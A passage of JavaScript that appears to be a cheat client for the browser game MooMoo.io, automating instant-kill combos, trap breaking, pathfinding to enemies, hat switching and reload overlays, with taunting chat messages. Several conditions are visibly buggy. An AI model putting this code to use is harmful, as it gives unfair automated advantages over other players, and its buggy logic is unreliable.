                        let trapInCondition = nearBuilds.find(e => e.active && Math.hypot(e.y - R.y2, e.x - R.x2) < 50 && e.name == "pit trap" && e.owner && e.owner.sid != R.sid && (R.team ? !Pt.includes(e.owner.sid) : 1));
                        if(enemies.length > 0) {
                            nea = Math.atan2(enemies[0].y2 - R.y2, enemies[0].x2 - R.x2);
                        }
                        let enemyInSpikeSyncCondition = function () {
                            if(!enemies[0]) return;
                            let closeSpike = nearBuilds.filter(e => e.active && /spik/.test(e.name) && e.owner && e.owner.sid != R.sid && (R.team ? !Pt.includes(e.owner.sid) : 1));
                            if(closeSpike.length > 0) {
                                for(let spike of closeSpike) {
                                    let e = [Math.hypot(enemies[0].y2 - spike.y, enemies[0].x2 - spike.x), Math.atan2(enemies[0].y2 - spike.y, enemies[0].x2 - spike.x)];
                                    let u = [Math.hypot(enemies[0].y2 - R.y2, enemies[0].x2 - R.x2), Math.atan2(enemies[0].y2 - R.y2, enemies[0].x2 - R.x2)];

                                    if(angleDist(e[1], u[1]) < Math.PI / 2.6 && u[0] < l.weapons[enemies[0].primary || 5].range + 80) {
                                        return true;
                                    }
                                    return false;
                                }
                                return false;
                            } else {
                                if(Math.hypot(R.y2 - enemies[0].y2, R.x2 - enemies[0].x2) < l.weapons[enemies[0].primary || 5].range + 70 && Math.hypot(R.y2 - enemies[0].y2, R.x2 - enemies[0].x2) < 130) {
                                    return true;
                                } else {
                                    return false;
                                }
                            };
                        }, checkOT = function () {
                            if(!enemies[0]) return false;

                            let OTUser = enemies.filter((a) => [4, 5].includes(a.weaponIndex) && (a.weaponIndex == 4 ? a.weaponVariant == 3 : a.weaponVariant > 1));

                            if(OTUser.length > 0) {

                                OTUser.forEach((_) => {
                                    if(_.skinIndex == 53 && _.primaryReload == 1) {
                                        return true;
                                    }
                                });

                                return false;

                            } else return false;
                        }
                        t1ck = checkOT();

                        if(bestinstaing) return;
                        if(autoinsta && enemyInCondition(1) && R.primaryReload == 1 && R.secondaryReload == 1 && enemies[0].weaponIndex != 11) {
                            if(R.weapons[0] == 0) {
                                r.send("ch", "Why eZ LoL?");
                                bestInsta();
                            } else {
                                r.send("ch", "BOOM HEADSHOT");
                                caseInsta();
                            }
                        } else {
                            executeEveryTicks.forEach(e => e());
                            if(cmi || !enemies) return;
                            let nb;
                            if(doExtremeReplacer) {
                                if(!enemies) return;
                                nb = nearBuilds.filter((a) => a.sid != R.sid && (!R.team) && Math.hypot(a.y - R.yVel, a.x - R.xVel) < 200 && a.active && a.name !== null);
                                if(nb.length > 0 && location.host != "moomoo.io" && enemies) {
                                    nb = nb.filter(e => {
                                        let n = W.filter(t => t.visible && Math.hypot(t.y - e.y, t.x - e.x) < l.weapons[t.weaponIndex].range + 35 + e.scale);
                                        let h = 0;
                                        n.forEach(e => {
                                            h += l.weapons[e.weaponIndex].dmg * R.skinIndex == 40 ? 3.3 : 1 * (e.weaponIndex == 10 ? 7.5 : 1);
                                        });
                                        return h > e.health;
                                    }).filter(e => enemies.length > 0 ? Math.hypot(e.y - enemies[0].y, e.x - enemies[0].x) < 90 : 1).map(e => Math.atan2(e.y - R.y, e.x - R.x));
                                    if(nb.length > 0) {
                                        let h = Math.random() > .5 && !enemyInCondition() ? R.items[4] : R.items[2];
                                    }
                                }
                            }
                            if(trapInCondition !== undefined) {
                                trapHealths = e.health;
                                if(aa) return;
                                autobreak.it = true;
                                if (R.chatMessage != "SANDY AUTOBREAKING") {
                                    r.send("ch", "SANDY AUTOBREAKING");
                                }
                                let breaks = R.weapons[1] == 10 ? "secondaryReload" : "primaryReload";
                                if(!useShield) {
                                    aw = R.weapons[1] == 10 ? 1 : 0;
                                    Sn(R.weapons[1] == 10 ? 10 : R.weapons[0], true);
                                }
                                let spikes = N.some(e => {
                                    if(e.name && e.id == (7, 8, 9) && e.active && /spik/.test(e.name) && Math.hypot(e.y - R.y2, e.x - R.x2) < 150 && e.owner.sid != R.sid && (R.team ?! Pt.includes(e.owner.sid) : true)) {
                                        return true;
                                    }
                                    return false;
                                });

                                let closedSpace = nearBuilds.filter(e => e.active && Math.hypot(e.y - R.y, e.x - R.x) < 200).length > 3;
                                autobreak.a = Math.atan2(trapInCondition.y - R.y2, trapInCondition.x - R.x2);

                                if(R[breaks] == 1) {
                                    autobreak.h = true;
                                    Hg((antiHitSpikeTrap && trapInCondition.health < getBreakDmg(R) && enemyInCondition()) ? 6 : 40, sandy ? enemies.tailIndex == 21 ? 13 : enemies.tailIndex == 13 ? 21 : enemies.tailIndex == 18 ? 21 : enemies.tailIndex == 21 ? 18 : lab ? 21 : 11 : ae86 ? R.weapons[1] == 10 ? 21 : 0 : enemyInCondition() ? 18 : lab ? 21 : 11);
                                    r.send("7", 1);

                                    if(trapInCondition.health < getBreakDmg(R) && enemyInCondition()) {
                                        let interval = setInterval(autobreak.a);
                                        nextTickDo(() => {clearInterval(interval)});
                                    }

                                    nextTickDo(() => {
                                        let bullBleed = l.ticks - bullTick > 8 && R.clownCounter > 0 && R.skinIndex != 45;
                                        let accessories = R && enemies && Math.hypot(enemies.x - R.x2, enemies.y - R.y2) <= 300 && [13 || 18].includes(enemies[0].tailIndex) ? 21 : enemies[0].tailIndex == 21 ? 13 : bullBleed ? 13 : 11;

                                        if(trapInCondition.health <= (l.weapons[R.weapons[0]].dmg * (R.skinIndex == 40 ? 3.3 : 1)) && R.weapons[1] == 10 && R.primaryReload == 1) {
                                            setWeapon(0);
                                            ae86 ? Hg(40, R.weapons[1] == 10 ? 21 : 0) : rv2 ? Hg(40, R.clownCounter > 1 && enemyInCondition() ? 18 : 0) : fz ? Hg(40, R.clownCounter > 3 && enemyInCondition() ? 18 : 0) : don || sandy ? Hg(40, enemyInCondition() ? 21 : lab ? 21 : 11) : lur ? Hg(40, 18) : Hg(40, ae86 && R.secondary == 10 ? 21 : 0);
                                            autobreak.h = true;

                                            nextTickDo(() => {
                                                autobreak.h = false;
                                                sandy || rv2 ? Hg(spikes.length > 2 || closedSpace ? 26 : 6, accessories) : fz ? Hg(spikes.length > 2 ? 26 : 22) : lur ? Hg(6, 11) : ae86 ? Hg(6, R.secondary == 10 ? 21 : 0) : don ? Hg(6, enemyInCondition() ? 21 : 11) : Hg(closedSpace ? 26 : 6, 11);
                                                r.send("7", 1);
                                            });
                                        } else {
                                            autobreak.h = false;
                                            sandy || rv2 ? Hg(spikes.length > 2 || closedSpace ? 26 : 6, accessories) : fz ? Hg(spikes.length > 2 ? 26 : 22) : lur ? Hg(6, 11) : ae86 ? Hg(6, R.secondary == 10 ? 21 : 0) : don ? Hg(6, enemyInCondition() ? 21 : 11) : Hg(closedSpace ? 26 : 6, 11);
                                            r.send("7", 1);
                                        }
                                    });
                                }
                            }
                            else {
                                let hit = false;
                                setInterval(() => {
                                    window.hit = hit
                                });
                                if(isNaN(wn) && !lur && pathFind.enabled) {
                                    let path;
                                    pathFind.show = true;
                                    if([10, 15].includes(R.secondary) && R.secondaryReload != 1 || R.clownCounter > 3) {
                                        path = doPathFind(nearBuilds, [enemies[0].x2 + 300 * Math.cos(nea + Math.PI), enemies[0].y2 + 300 * Math.sin(nea + Math.PI)]);
                                    } else {
                                        path = doPathFind(nearBuilds, [enemies[0].x2, enemies[0].y2]);
                                    }
                                    /* Make pathfinder automatically break builds in way of pathfinding to enemy */
                                    r.send("33", path ? Math.atan2(path[1].y - path[0].y, path[1].x - path[0].x) : null);
                                    pathFind.paths = path;
                                }

                                if(!ae86) {
                                    if(antibull) {
                                        if(enemyInCondition() && (abs ? (R.primaryReload < 1 && R.primaryReload > 0.5) : R.primaryReload > 0.5) && !cancelAllhats) {
                                            if(R.clownCounter < 5 && [4, 5].includes(R.primary) && [3, 4, 5].includes(enemies[0].primary) && enemies.skinIndex != 11) {
                                                if([4, 5].includes(R.weaponIndex)) setWeapon(0);
                                                Hg(11, 21);
                                                ![4, 5].includes(R.primary) ? lab = false : lab = true;
                                            } else if(R.clownCounter > 3 || enemies.skinIndex == 11) {
                                                Hg(26, 21);
                                            }
                                        }
                                    }
                                    if(dab) {
                                        if(!abs && R.secondaryReload == 1 && chain) instaX();
                                        else {
                                            aa = true;
                                            r.send("2", nea);
                                            Hg(7, 18);
                                            r.send("7", 1);
                                            hit = true;
                                            setTimeout (() => {
                                                r.send("7", 1);
                                                basicGear(bTick);
                                                aa = false;
                                            }, 120);
                                        }
                                    }
                                }

                                if(!enemyInCondition() && R.skinIndex != 45) {
                                    let rightAccessories = R && enemies && Math.hypot(enemies.x - R.x2, enemies.y - R.y2) <= 300 && [13 || 18].includes(enemies.tailIndex) ? 21 : enemies.tailIndex == 21 ? 18 : enemyInCondition() ? 21 : 11;
                                    let turrets = N.filter(c => c.active && c.isItem && R.sid != c.owner.sid && (!R.team || !Pt.includes(c.owner.sid)) && c.shootCount >= 2e3 && c.id == 17 && Math.hypot(R.y2 - c.y, R.x2 - c.x) - 35 - c.scale <= 700);
                                    let bullBleed = l.ticks - bullTick > 8 && R.clownCounter > 0 && R.skinIndex != 45

                                    if(turrets.length > 3) {
                                        Hg(bullBleed ? 7 : 22, ae86 ? 11 : rightAccessories);
                                    } else if(wn == null && !ae86 && !lur && !don) {
                                        sandy || rv2 ? Hg(bullBleed ? 7 : 6, rightAccessories) : Hg(bullBleed ? 7 : 22, rightAccessories);

                                    } else if(enemyInSpikeSyncCondition() && enemies[0].primaryReload == 1) {
                                        Hg(6, lab ? 21 : 11);
                                    } else {
                                        if(l.ticks - bullTick > 8 && R.clownCounter > 0 && R.skinIndex != 45) {
                                            Hg(7, ae86 ? 11 : enemyInCondition() ? 13 : lab ? 21 : 11);
                                        } else {
                                            if(ae86) {
                                                if(R.weapons[1] == 10) {
                                                    dg();
                                                } else {
                                                    Hg(bullBleed ? 7 : 6, 11);
                                                }
                                            } else {
                                                bullBleed ? Hg(7, lab ? 21 : 11) : basicGear(bTick);
                                            }
                                        }
                                    }
                                }

                                let exact = 239,
                                    otCh = function(dist) {
                                        if(Math.abs(dist - exact) < 30) {
                                            let a = Math.abs(dist - exact);
                                            if(a < 5) {
                                                Hg(40, 0);
                                                r.send("33", null);
                                                return true;
                                            } else {
                                                Hg(40, a < 20 ? 0 : 11);
                                                let prev = wn;
                                                wn = dist > exact ? nea : nea + Math.PI;
                                                r.send("33", dist > exact ? nea : nea + Math.PI);
                                                nextTickDo(function() { wn = prev; });
                                                return false;
                                            }
                                        }
                                        return false;
                                    }
                                if(enemies[0] && enemyInSpikeSyncCondition() && enemies[0].primaryReload == 1 && ae86) {
                                    Hg(6, 0)
                                }
                                if(!aa && aOT && enemies[0] && enemies[0].weaponIndex != 11 && R.primaryReload == 1 && (R.weapons[1] == 15 ? R.secondaryReload == 1 : true) && [4, 5].includes(R.weapons[0]) && enemies[0].skinIndex != 6 && (4 == R.weapons[0] ? R.primaryVariant == 3 : R.primaryVariant > 1) && R.turretReload == 1 &&
                                   otCh(Math.hypot(R.y2 - enemies[0].y2, R.x2 - enemies[0].x2))) {
                                    r.send("ch", "GoT A BoT");
                                    const pr = wn;
                                    aa = true;
                                    const a = nea;
                                    r.send("2", nea);
                                    wn = nea;
                                    r.send("33", wn);
                                    Hg(53, don ? 11 : 0);
                                    if(R.weapons[0] == 4) {
                                        r.send("7", 1);
                                    }
                                    setWeapon(1);
                                    const t = setInterval(function() {
                                        if(R.weapons[0] == 4) {
                                            nea = a + Math.PI;
                                            wn = a;
                                            r.send("33", wn);
                                        } else {
                                            wn = a;
                                            r.send("33", a);
                                        }
                                    });
                                    nextTickDo(function () {
                                        setWeapon(0);
                                        Hg(7, don ? 19 : 18);
                                        if(R.weapons[0] == 4) {} else {
                                            r.send("7", 1);
                                        }
                                        if(R.weapons[0] == 4) {
                                            clearInterval(t);
                                            nea = a;
                                            wn = pr;
                                        }
                                        nextTickDo(function () {
                                            aa = false;
                                            r.send("7", 1);
                                            wn = pr;
                                            clearInterval(t);
                                            r.send("33", pr);
                                        });
                                    });
                                }
                                if(abs && [3, 4, 5, 6, 7].includes(R.primary) && enemyInCondition()) {
                                    if(!useShield) {
                                        setWeapon(0);
                                        if(R.primaryReload == 1 && !aa) {
                                            if(appre && (trackers[enemies[0].id] && trackers[enemies[0].id].diesTo && trackers[enemies[0].id].diesTo.find(e => e[0] == "bullspam") ? (maxBullspam = trackers[enemies[0].id].diesTo.find(e => e[0] == "bullspam")[1], bullspams >= maxBullspam) : true) && R.secondaryReload == 1) {
                                                bullspams = 0;
                                                if(R.weapons[1] == 10) {
                                                    caseInsta();
                                                } else {
                                                    if(!ae86) {
                                                        if([12, 15, 31, 6, 53].includes(_.skinIndex)) {
                                                            instaX(2);
                                                        } else if([7, 11, 55].includes(_.skinIndex)) {
                                                            instaX(1);
                                                        }
                                                    } else {
                                                        instaX(2);
                                                    }
                                                }
                                            } else if (lur ? R.clownCounter < 3 : true) {
                                                bullspams++;
                                                aa = true;
                                                r.send("2", nea);
                                                if(ae86) {
                                                    Hg(7, 0);
                                                    if(R.weapons[1] == 10) {
                                                        Hg(21, 1);
                                                    }
                                                } else {
                                                    if(pvpmode) {
                                                        if(Date.now() - useps > 2000) {
                                                            useps = Date.now();
                                                            if(fz || lur || rv2) {
                                                                Hg(R.clownCounter > 4 ? 58 : 55, 18);
                                                            } else {
                                                                if(fz || rv2) {
                                                                    Hg(7, enemyInCondition() ? 18 : bTick ? 13 : 0);
                                                                } else if(don || sandy) {
                                                                    Hg(7, enemyInCondition() ? 21 : 0);
                                                                } else if(ae86) {
                                                                    Hg(7, 0);
                                                                } else if(lur) {
                                                                    Hg(7, 18);
                                                                } else if(sandy) {
                                                                    Hg(R.clownCounter > 3 ? 58 : 7, enemies.tailIndex == 21 ? 18 : enemies.tailIndex == 18 ? 21 : enemies.tailIndex == 13 ? 21 : 18);
                                                                };
                                                            }
                                                        } else {
                                                            if(fz || rv2) {
                                                                Hg(7, enemyInCondition() ? 18 : bTick ? 13 : 0);
                                                            } else if(don) {
                                                                Hg(7, enemyInCondition() ? 21 : 0);
                                                            } else if(ae86) {
                                                                Hg(7, R.weapons[1] == 10 ? 21 : 0);
                                                            } else if(lur) {
                                                                Hg(7, 18);
                                                            } else if(sandy) {
                                                                Hg(R.clownCounter > 3 ? 58 : 7, enemies.tailIndex == 21 ? 18 : enemies.tailIndex == 18 ? 21 : enemies.tailIndex == 13 ? 21 : 18);
                                                            };
                                                        }
                                                    } else {
                                                        if(fz || rv2) {
                                                            Hg(7, enemyInCondition() ? 18 : bTick ? 13 : 0);
                                                        } else if(don) {
                                                            Hg(7, enemyInCondition() ? 21 : 0);
                                                        } else if(ae86) {
                                                            Hg(7, R.weapons[1] == 10 ? 21 : 0);
                                                        } else if(lur) {
                                                            Hg(7, 18);
                                                        } else if(sandy) {
                                                            Hg(R.clownCounter > 3 ? 55 : 7, enemies.tailIndex == 21 ? 18 : enemies.tailIndex == 18 ? 21 : enemies.tailIndex == 13 ? 21 : 18);
                                                        };
                                                    }
                                                }
                                                r.send("7", 1);
                                                hit = true;
                                                let velSpike = N.find((e => Math.hypot(e.y - R.y, e.x - R.x) < 184 && /spik/.test(e.name) && e.active && e.owner.sid == R.sid));
                                                nextTickDo (() => {
                                                    r.send("7", 1);
                                                    if(!ae86) {
                                                        if(R.clownCounter > 4) {
                                                            if((R.y < 6850 || R.y > 7550)) Hg(26, lab ? 21 : 11);
                                                        } else {
                                                            if((R.y < 6850 || R.y > 7550)) basicGear(bTick);
                                                        }
                                                    } else {
                                                        if((R.y < 6850 || R.y > 7550)) Hg(6, 21);
                                                    }
                                                    if(ae86 && R.weapons[1] == 10) {
                                                        Hg(21, 1)
                                                    }
                                                    if(ae86 ? !enemyInCondition() : true) {
                                                        Hg(6, 11);
                                                    }
                                                    aa = false;
                                                });
                                            }
                                        }
                                    }
                                } else {
                                    bullspams = 0;
                                    if(!aa){
                                        if(R.weapons[1] && R.secondaryReload < 1 && Date.now() - mlh > 300) {
                                            setWeapon(1);
                                        } else if(R.weapons[1] == 15) setWeapon(0);
                                    }
                                }
                                if(!false) {
                                }
                            }
                        }
                    }
                    function dg () {
                        let Qs = R.y2*1.5-R.y/2;
                        if(Qs < 2400) Hg(15, e?11:21);
                        else if(Qs > 6850 && Qs < 7550) Hg(31, e?11:21);
                        else Hg(12, e?11:21)
                    }

                    var bullspams = 0;

                    function caseInsta () {
                        let type = document.getElementById("upgrInstaType").value;
                        if(R.weapons[0] == 7 && R.weapons[1] == 10 && "dhkm" != type) {
                            if(type == "dhkhkm") {
                                autoinsta = false;
                                aa = true;
                                r.send("2", nea);
                                setWeapon(0);
                                Hg(7, 18);
                                r.send("7", 1);
                                nextTickDo(function () {
                                    r.send("2", nea);
                                    r.send("6", 4);
                                    r.send("6", 15);
                                    setWeapon(0);
                                    nextTickDo(function() {
                                        Hg(53, 21);
                                        r.send("2", nea);
                                        setWeapon(1);
                                        nextTickDo(function () {
                                            r.send("7", 1);
                                            aa = false;
                                            Hg(6, 11);
                                        });
                                    });
                                });
                            } else if(type == "dhkh") {

                                setWeapon(0);
                                Hg(53, 21);
                                r.send("7", 1);
                                nextTickDo(function () {
                                    r.send("2", nea);
                                    r.send("6", 4);
                                    setWeapon(0);
                                    Hg(7, 18);
                                    nextTickDo(function () {
                                        Hg(6, 11);
                                        aa = false;
                                        r.send("7", 1);
                                    });
                                });
                            }
                        } else {
                            if(R.weapons[1] == 10 && [3, 4, 5].includes(R.primary)) {
                                if(Math.hypot(enemies[0].y2 - R.yVel, enemies[0].x2 - R.xVel) < 100) {
                                    autoinsta = false;
                                    aa = true;
                                    r.send("2", nea);
                                    instaKH();
                                }
                            } else {
                                autoinsta = false;
                                aa = true;
                                r.send("2", nea);
                                instaX();
                            }
                        }
                    }

                    function bestInsta() {
                        bestinstaing = true;
                        aa = true;
                        setWeapon(0);
                        Hg(7, 18);
                        r.send("7", 1);
                        nextTickDo(function () {
                            r.send("6", 5);
                            r.send("6", 17);
                            r.send("6", 31);
                            r.send("6", l.list.findIndex(e => e.name.includes("greater"))+16);
                            r.send("6", 9);
                            setWeapon(0);
                            nextTickDo(function () {
                                setWeapon(1);
                                Hg(53, 21);
                                nextTickDo(function () {
                                    r.send("6", l.list.findIndex(e => e.name.includes("teleporter"))+16);
                                    r.send("6", 4);
                                    r.send("6", 15);
                                    setWeapon(1);
                                    nextTickDo(function () {
                                        setWeapon(0);
                                        Hg(7, 18);
                                        nextTickDo(function () {
                                            aa = false;
                                            bestinstaing = false;
                                            r.send("7", 1);
                                        });
                                    });
                                });
                            });
                        });
                    }

                    setInterval(()=>{let t=t=>"none"!=t.style.display,e=3;try{if(t(document.getElementById("actionBarItem26"))){let n;(n=document.createElement("div")).id="windmillCounts26",n.style.cssText="position: absolute;top: 0;padding-left: 5px;font-size: 2em;color: #fff;",document.getElementById("windmillCounts26")||document.getElementById("actionBarItem26").appendChild(n),document.getElementById("windmillCounts26").innerHTML=R.itemCounts[e]||0}}catch(o){}try{if(t(document.getElementById("actionBarItem27"))){let i;(i=document.createElement("div")).id="windmillCounts27",i.style.cssText="position: absolute;top: 0;padding-left: 5px;font-size: 2em;color: #fff;",document.getElementById("windmillCounts27")||document.getElementById("actionBarItem27").appendChild(i),document.getElementById("windmillCounts27").innerHTML=R.itemCounts[e]||0}}catch(l){}try{if(t(document.getElementById("actionBarItem28"))){let d;(d=document.createElement("div")).id="windmillCounts28",d.style.cssText="position: absolute;top: 0;padding-left: 5px;font-size: 2em;color: #fff;",document.getElementById("windmillCounts28")||document.getElementById("actionBarItem28").appendChild(d),document.getElementById("windmillCounts28").innerHTML=R.itemCounts[e]||0}}catch(s){}e=6;try{if(t(document.getElementById("actionBarItem32"))){let a;(a=document.createElement("div")).id="boostCounts32",a.style.cssText="position: absolute;top: 0;padding-left: 5px;font-size: 2em;color: #fff;",document.getElementById("boostCounts32")||document.getElementById("actionBarItem32").appendChild(a),document.getElementById("boostCounts32").innerHTML=R.itemCounts[e]||0}}catch(m){}e=5;try{if(t(document.getElementById("actionBarItem31"))){let r;(r=document.createElement("div")).id="trapCounts31",r.style.cssText="position: absolute;top: 0;padding-left: 5px;font-size: 2em;color: #fff;",document.getElementById("trapCounts31")||document.getElementById("actionBarItem31").appendChild(r),document.getElementById("trapCounts31").innerHTML=R.itemCounts[e]||0}}catch(p){}e=2;for(var c=0;c<4;c++)try{if(t(document.getElementById("actionBarItem"+(22+c)))){let f;(f=document.createElement("div")).id="spikeCounts"+(22+c),f.style.cssText="position: absolute;top: 0;padding-left: 5px;font-size: 2em;color: #fff;",document.getElementById("spikeCounts"+(22+c))||document.getElementById("actionBarItem"+(22+c)).appendChild(f),document.getElementById("spikeCounts"+(22+c)).innerHTML=R.itemCounts[e]||0}}catch(y){}try{if(t(document.getElementById("actionBarItem"+(22+c)))){let B;(B=document.createElement("div")).id="cookieCounts17",B.style.cssText="position: absolute;top: 0;padding-left: 5px;font-size: 2em;color: #fff;",document.getElementById("cookieCounts17")||document.getElementById("actionBarItem17").appendChild(B),document.getElementById("cookieCounts17").innerHTML=Math.floor(Number(document.getElementById("foodDisplay").innerHTML)/15)}}catch(I){}try{if(t(document.getElementById("actionBarItem"+(22+c)))){let g;(g=document.createElement("div")).id="appleCounts16",g.style.cssText="position: absolute;top: 0;padding-left: 5px;font-size: 2em;color: #fff;",document.getElementById("appleCounts16")||document.getElementById("actionBarItem16").appendChild(g),document.getElementById("appleCounts16").innerHTML=Math.floor(Number(document.getElementById("foodDisplay").innerHTML)/10)}}catch(E){}e=7;try{if(t(document.getElementById("actionBarItem33"))){let u;(u=document.createElement("div")).id="turretCounts33",u.style.cssText="position: absolute;top: 0;padding-left: 5px;font-size: 2em;color: #fff;",document.getElementById("turretCounts33")||document.getElementById("actionBarItem33").appendChild(u),document.getElementById("turretCounts33").innerHTML=R.itemCounts[e]||0}}catch(C){}for(c=0,e=1;c<3;c++)try{if(t(document.getElementById("actionBarItem"+(19+c)))){let T;(T=document.createElement("div")).id="wallCounts"+(19+c),T.style.cssText="position: absolute;top: 0;padding-left: 5px;font-size: 2em;color: #fff;",document.getElementById("wallCounts"+(19+c))||document.getElementById("actionBarItem"+(19+c)).appendChild(T),document.getElementById("wallCounts"+(19+c)).innerHTML=R.itemCounts[e]||0}}catch(_){}},1e3);

                    let relMin = 55;
                    let relMax = 385;
                    function getBarColor(float, isPri) {
                        if(isPri) {
                            return float <= 0.3703703703703704 ? '#8ecc51' : float <= 0.7407407407407408 ? `hsl(${relMin}, 50%, 60%)` : '#f9f64f';
                        } else {
                            let max = 1 - float;
                            if(_.secondary != 10){
                                let hsl = `hsl(${Math.round(relMax + max*(relMin-relMax))%360}, 50%, 60%)`;
                                return float == 1 ? '#f4f259' : hsl;
                            } else if(_.secondary == 10){
                                let hsl = `hsl(${Math.round(relMax + max*(relMin-relMax))%360}, 50%, 60%)`;
                                return float <= 0.3703703703703704 ? '#73bfa2' : float <= 0.7407407407407408 ? `#8ecc51` : '#f9f64f';
                            }
                        }
                    }

                    function drawBars(_, f, d) {
                        if(_.isPlayer) {


                            let reloads = [_.primaryReload, _.secondaryReload],
                                renderWithin = 2 * o.healthBarWidth + 2 * o.healthBarPad,
                                x = _.x - f - renderWithin/2,
                                y = _.y - d + _.scale + o.nameY + 18,
                                eachBarWidth = renderWithin/reloads.length,
                                pad = o.healthBarPad;


                            if(!vs){
                                _.health > 0 && (o.healthBarWidth, be.fillStyle = rt,
                                                 be.roundRect(_.x - f - o.healthBarWidth - o.healthBarPad, _.y - d + _.scale + o.nameY+18, 2 * o.healthBarWidth + 2 * o.healthBarPad, 17, 8), be.fill(),
                                                 be.fillStyle = _ == R || _.team && _.team == R.team ? "#8ecc51" : "#cc5151",
                                                 be.roundRect(_.x - f - o.healthBarWidth, _.y - d + _.scale + o.nameY + o.healthBarPad+18, 2 * o.healthBarWidth * (_.health / _.maxHealth), 17 - 2 * o.healthBarPad, 7),
                                                 be.fill());
                            }
                            if(fz) {
                                if(_.sid == R.sid) {
                                    _.health > 0 && (o.healthBarWidth, be.fillStyle = rt,
                                                     be.roundRect(_.x - f - o.healthBarWidth - o.healthBarPad, _.y - d + _.scale + o.nameY+18, 2 * o.healthBarWidth + 2 * o.healthBarPad, 17, 8), be.fill(),
                                                     be.fillStyle = _ == R || _.team && _.team == R.team ? "#8ecc51" : "#cc5151",
                                                     be.roundRect(_.x - f - o.healthBarWidth, _.y - d + _.scale + o.nameY + o.healthBarPad+18, 2 * o.healthBarWidth * (_.health / _.maxHealth), 17 - 2 * o.healthBarPad, 7),
                                                     be.fill());
                                    if(spec) return;
                                    y -= 15;
                                    be.beginPath();
                                    be.fillStyle = rt;
                                    be.roundRect(x + eachBarWidth-pad, y, eachBarWidth+pad, 17, 8);
                                    be.fill();
                                    be.fillStyle = getBarColor(R.secondaryReload, 0);
                                    be.roundRect(x + eachBarWidth, y+pad, (eachBarWidth-pad) * R.secondaryReload, (17-pad*2), 8);
                                    be.fill();
                                    be.beginPath();
                                    be.fillStyle = rt;
                                    be.roundRect(x, y, eachBarWidth+pad, 17, 8);
                                    be.fill();
                                    be.fillStyle = getBarColor(R.primaryReload, 1);
                                    be.roundRect(x+pad, y+pad, (eachBarWidth-pad) * R.primaryReload, (17-pad*2), 8);
                                    be.fill();
                                    be.fillStyle = rt;
                                    be.roundRect(_.x - f - o.healthBarWidth - o.healthBarPad, _.y - d + _.scale + o.nameY + 31.5, 2 * o.healthBarWidth + 2 * o.healthBarPad, 17, 8);
                                    be.fill();
                                    be.fillStyle = "#8f815a";
                                    be.roundRect(_.x - f - o.healthBarWidth, _.y - d + _.scale + o.nameY + o.healthBarPad + 31.5, 2 * o.healthBarWidth * (R.turretReload), 17 - 2 * o.healthBarPad, 7);
                                    be.fill();
                                } else if(_.sid != R.sid) {
                                    _.health > 0 && (o.healthBarWidth, be.fillStyle = rt,
                                                     be.roundRect(_.x - f - o.healthBarWidth - o.healthBarPad, _.y - d + _.scale + o.nameY+18, 2 * o.healthBarWidth + 2 * o.healthBarPad, 17, 8), be.fill(),
                                                     be.fillStyle = _ == R || _.team && _.team == R.team ? "#8ecc51" : "#cc5151",
                                                     be.roundRect(_.x - f - o.healthBarWidth, _.y - d + _.scale + o.nameY + o.healthBarPad+18, 2 * o.healthBarWidth * (_.health / _.maxHealth), 17 - 2 * o.healthBarPad, 7),
                                                     be.fill());
                                    if(spec) return;
                                    y -= 15;
                                    be.beginPath();
                                    be.fillStyle = rt;
                                    be.roundRect(x + eachBarWidth-pad, y, eachBarWidth+pad, 17, 8);
                                    be.fill();
                                    be.fillStyle = getBarColor(_.secondaryReload, 0);
                                    be.roundRect(x + eachBarWidth, y+pad, (eachBarWidth-pad) * _.secondaryReload, (17-pad*2), 8);
                                    be.fill();
                                    be.beginPath();
                                    be.fillStyle = rt;
                                    be.roundRect(x, y, eachBarWidth+pad, 17, 8);
                                    be.fill();
                                    be.fillStyle = getBarColor(_.primaryReload, 1);
                                    be.roundRect(x + pad, y + pad, (eachBarWidth-pad) * _.primaryReload, (17 - pad * 2), 8);
                                    be.fill();
                                } else if(_.sid != R.sid && _.team === R.team && _.sid != enemies.sid) {
                                    _.health > 0 && (o.healthBarWidth, be.fillStyle = rt,
                                                     be.roundRect(_.x - f - o.healthBarWidth - o.healthBarPad, _.y - d + _.scale + o.nameY+18, 2 * o.healthBarWidth + 2 * o.healthBarPad, 17, 8), be.fill(),
                                                     be.fillStyle = _ == R || _.team && _.team == R.team ? "#8ecc51" : "#cc5151",
                                                     be.roundRect(_.x - f - o.healthBarWidth, _.y - d + _.scale + o.nameY + o.healthBarPad+18, 2 * o.healthBarWidth * (_.health / _.maxHealth), 17 - 2 * o.healthBarPad, 7),
                                                     be.fill());
                                    if(spec) return;
                                    y -= 15;
                                    be.beginPath();
                                    be.fillStyle = rt;
                                    be.roundRect(x + eachBarWidth - pad, y, eachBarWidth + pad, 17, 8);
                                    be.fill();
                                    be.beginPath();
                                    be.fillStyle = rt;
                                    be.roundRect(x, y, eachBarWidth + pad, 17, 8);
                                    be.fill();
                                }
                            } else if(rv2) {
                                _.health > 0 && (o.healthBarWidth, be.fillStyle = rt,
                                                 be.roundRect(_.x - f - o.healthBarWidth - o.healthBarPad, _.y - d + _.scale + o.nameY+18, 2 * o.healthBarWidth + 2 * o.healthBarPad, 17, 8), be.fill(),
                                                 be.fillStyle = _ == R || _.team && _.team == R.team ? "#8ecc51" : "#cc5151",
                                                 be.roundRect(_.x - f - o.healthBarWidth, _.y - d + _.scale + o.nameY + o.healthBarPad+18, 2 * o.healthBarWidth * (_.health / _.maxHealth), 17 - 2 * o.healthBarPad, 7),
                                                 be.fill());
                                if(spec) return;
                                y -= 15;
                                be.beginPath();
                                be.fillStyle = rt;
                                be.roundRect(x + eachBarWidth-pad, y, eachBarWidth+pad, 17, 8);
                                be.fill();
                                be.fillStyle = getBarColor(_.secondaryReload, 0);
                                be.roundRect(x + eachBarWidth, y+pad, (eachBarWidth-pad) * _.secondaryReload, (17-pad*2), 8);
                                be.fill();
                                be.beginPath();
                                be.fillStyle = rt;
                                be.roundRect(x, y, eachBarWidth+pad, 17, 8);
                                be.fill();
                                be.fillStyle = getBarColor(_.primaryReload, 1);
                                be.roundRect(x + pad, y + pad, (eachBarWidth-pad) * _.primaryReload, (17 - pad * 2), 8);
                                be.fill();
                            } else if(ae86) {
                                _.health > 0 && (o.healthBarWidth, be.fillStyle = rt,
                                                 be.roundRect(_.x - f - o.healthBarWidth - o.healthBarPad, _.y - d + _.scale + o.nameY+18, 2 * o.healthBarWidth + 2 * o.healthBarPad, 17, 8), be.fill(),
                                                 be.fillStyle = _ == R || _.team && _.team == R.team ? "#8ecc51" : "#cc5151",
